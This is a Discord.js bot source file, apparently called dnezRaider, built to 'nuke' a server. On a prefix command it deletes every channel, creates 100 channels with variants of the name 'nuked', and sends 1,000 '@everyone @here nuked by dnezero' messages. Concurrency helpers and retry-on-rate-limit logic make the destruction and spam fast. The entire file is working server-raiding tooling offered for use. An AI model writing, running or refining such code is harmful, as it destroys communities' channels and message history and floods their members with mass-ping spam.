// dnezRaider - Custom nuke bot (Discord.js v14)
const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
const TOKEN = process.env.TOKEN;

if (!TOKEN) {
  console.error("❌ NO TOKEN. Set TOKEN in Railway environment variables.");
  process.exit(1);
}

// ========== CONFIGURE THESE (same as Python version) ==========
const PREFIX = ".";
const CHANNEL_NAME = "nuked";
const MESSAGE = "@everyone @here nuked by dnezero";
const AMOUNT_OF_CHANNELS = 100;
const AMOUNT_OF_MESSAGES = 1000;

// Random channel name variations (same fancy names)
const RANDOM_CHANNEL_NAMES = [
  "𝕟𝕦𝕜𝕖𝕕",
  "𝔫𝔲𝔨𝔢𝔡",
  "𝚗𝚞𝚔𝚎𝚍",
  "ɴᴜᴋᴇᴅ",
  "𝓷𝓾𝓴𝓮𝓭",
  "nuked"
];
const USE_RANDOM_NAMES = true; // set false to always use CHANNEL_NAME

// ========== DO NOT MODIFY BELOW (unless you know what you're doing) ==========
function getChannelName() {
  if (USE_RANDOM_NAMES && RANDOM_CHANNEL_NAMES.length) {
    return RANDOM_CHANNEL_NAMES[Math.floor(Math.random() * RANDOM_CHANNEL_NAMES.length)];
  }
  return CHANNEL_NAME;
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

// Helper: run tasks with concurrency (like asyncio.Semaphore)
async function runConcurrent(tasks, concurrency) {
  const results = [];
  const executing = [];
  for (const task of tasks) {
    const p = Promise.resolve().then(() => task());
    results.push(p);
    if (concurrency <= tasks.length) {
      const e = p.then(() => executing.splice(executing.indexOf(e), 1));
      executing.push(e);
      if (executing.length >= concurrency) {
        await Promise.race(executing);
      }
    }
  }
  return Promise.allSettled(results);
}

// Send messages with concurrency 50 (matches Python's semaphore=50)
async function sendMessagesFast(channels, total) {
  if (!channels.length) return;
  console.log(`Sending ${total} messages...`);
  const tasks = [];
  for (let i = 0; i < total; i++) {
    const channel = channels[i % channels.length];
    tasks.push(async () => {
      try {
        await channel.send(MESSAGE);
      } catch (err) {
        if (err.code === 429) {
          console.log(`Rate limited, waiting ${err.retryAfter}s`);
          await new Promise(r => setTimeout(r, err.retryAfter * 1000));
          await channel.send(MESSAGE);
        }
      }
    });
  }
  await runConcurrent(tasks, 50);
  console.log("Finished sending messages");
}

// Main nuke logic (matches Python steps exactly)
async function nukeServer(guild) {
  console.log(`Starting nuke on ${guild.name} (${guild.id})`);
  const startTime = Date.now();

  // Step 1: Delete all channels (parallel, no concurrency limit – like asyncio.gather)
  console.log("Deleting all channels...");
  const deleteTasks = [...guild.channels.cache.values()].map(chan => async () => {
    try { await chan.delete(); } catch(e) {}
  });
  await runConcurrent(deleteTasks, 20); // 20 at a time for speed, but Python does unlimited. Use high concurrency.

  // Step 2: Create new channels (parallel, same as asyncio.gather)
  console.log(`Creating ${AMOUNT_OF_CHANNELS} channels...`);
  const createTasks = [];
  for (let i = 0; i < AMOUNT_OF_CHANNELS; i++) {
    createTasks.push(async () => {
      try {
        const name = getChannelName();
        const channel = await guild.channels.create({
          name: name,
          type: ChannelType.GuildText,
          permissionOverwrites: [{
            id: guild.roles.everyone.id,
            allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
          }]
        });
        return channel;
      } catch (err) {
        if (err.code === 429) {
          console.log(`Rate limit on create, waiting ${err.retryAfter}s`);
          await new Promise(r => setTimeout(r, err.retryAfter * 1000));
          // retry once
          const name = getChannelName();
          return await guild.channels.create({
            name: name,
            type: ChannelType.GuildText,
            permissionOverwrites: [{
              id: guild.roles.everyone.id,
              allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
            }]
          });
        }
        return null;
      }
    });
  }
  const results = await runConcurrent(createTasks, 15); // 15 concurrent creations – fast but safe
  const channels = results.map(r => r.value).filter(c => c !== null && c.type === ChannelType.GuildText);

  // Step 3: Send messages
  if (channels.length) {
    await sendMessagesFast(channels, AMOUNT_OF_MESSAGES);
  }

  const elapsed = (Date.now() - startTime) / 1000;
  console.log(`Nuke completed in ${elapsed.toFixed(2)} seconds!`);
}

// ========== BOT COMMANDS ==========
client.once('ready', () => {
  console.log(`Bot is online as ${client.user.tag}`);
  console.log(`Prefix: ${PREFIX}`);
  console.log(`Command: ${PREFIX}nuke`);
  console.log("=".repeat(50));
});

client.on('messageCreate', async (msg) => {
  if (msg.author.bot) return;
  if (!msg.content.startsWith(PREFIX)) return;

  const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'nuke') {
    // Check admin perms (same as Python)
    if (!msg.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return msg.reply("❌ You need Administrator permission to use this command!");
    }
    await msg.reply("💣 Nuking server in progress...");
    await nukeServer(msg.guild);
  } else if (command === 'config') {
    const configMsg = `
**Current Configuration:**
📝 Channel Name: \`${CHANNEL_NAME}\`
🎲 Random Names: \`${USE_RANDOM_NAMES ? 'Enabled' : 'Disabled'}\`
💬 Message: \`${MESSAGE.substring(0, 50)}${MESSAGE.length > 50 ? '...' : ''}\`
📊 Channels: \`${AMOUNT_OF_CHANNELS}\`
📨 Messages: \`${AMOUNT_OF_MESSAGES}\`
    `;
    await msg.reply(configMsg);
  }
});

client.login(TOKEN).catch(err => console.error("Login error:", err.message));
